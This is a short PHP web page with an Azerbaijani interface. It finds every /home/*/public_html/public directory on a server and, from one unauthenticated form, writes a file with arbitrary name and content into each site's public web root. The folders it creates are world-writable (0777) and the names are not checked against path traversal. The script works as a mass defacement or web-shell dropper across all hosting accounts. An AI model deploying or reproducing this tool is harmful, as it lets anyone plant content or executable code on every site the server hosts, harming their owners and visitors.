<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kütləvi Fayl və Qovluq Yaratma</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        form {
            max-width: 500px;
            margin: auto;
        }
        input, textarea, select, button {
            width: 100%;
            margin: 10px 0;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>Kütləvi Fayl və Qovluq Yaratma</h1>
    <form method="POST" action="">
        <p>Uyğun qovluqlarda əməliyyat aparılacaq: </p>
        <?php
        // Əsas qovluq
        $baseDir = '/home';

        // /home qovluğunu tarayın
        $validDirs = [];
        if (is_dir($baseDir)) {
            $dirs = scandir($baseDir);

            // Alt qovluqları yoxlayın
            foreach ($dirs as $dir) {
                if ($dir !== '.' && $dir !== '..') {
                    $targetPath = "$baseDir/$dir/public_html/public";
                    if (is_dir($targetPath)) {
                        $validDirs[] = $targetPath;
                        echo "<p>$targetPath</p>";
                    }
                }
            }
        }

        if (empty($validDirs)) {
            echo "<p style='color: red;'>Uyğun qovluq tapılmadı.</p>";
        }
        ?>

        <label for="new_folder">Yaradılacaq Qovluq Adı:</label>
        <input type="text" id="new_folder" name="new_folder" placeholder="yeni_qovluq" required>

        <label for="filename">Fayl Adı:</label>
        <input type="text" id="filename" name="filename" placeholder="1.txt" required>

        <label for="file_content">Fayl Məzmunu:</label>
        <textarea id="file_content" name="file_content" placeholder="Buraya fayl məzmununu yazın..." required></textarea>

        <button type="submit">Bütün Qovluqlarda Əməliyyat Apar</button>
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newFolder = $_POST['new_folder'];
        $filename = $_POST['filename'];
        $fileContent = $_POST['file_content'];

        // Əməliyyat aparılacaq qovluqların siyahısını yoxlayın
        if (!empty($validDirs)) {
            foreach ($validDirs as $targetPath) {
                $fullPath = $targetPath . '/' . $newFolder;

                // Qovluq yaradın
                if (!is_dir($fullPath)) {
                    if (mkdir($fullPath, 0777, true)) {
                        echo "<p>Qovluq yaradıldı: $fullPath</p>";
                    } else {
                        echo "<p style='color: red;'>Qovluq yaradıla bilmədi: $fullPath</p>";
                        continue;
                    }
                } else {
                    echo "<p>Qovluq artıq mövcuddur: $fullPath</p>";
                }

                // Fayl yaradın və məzmunu yazın
                $filePath = $fullPath . '/' . $filename;
                if (file_put_contents($filePath, $fileContent) !== false) {
                    echo "<p>Fayl yaradıldı: $filePath</p>";
                } else {
                    echo "<p style='color: red;'>Fayl yaradıla bilmədi: $filePath</p>";
                }
            }
        } else {
            echo "<p style='color: red;'>Əməliyyat aparılacaq qovluq tapılmadı.</p>";
        }
    }
    ?>
</body>
</html>
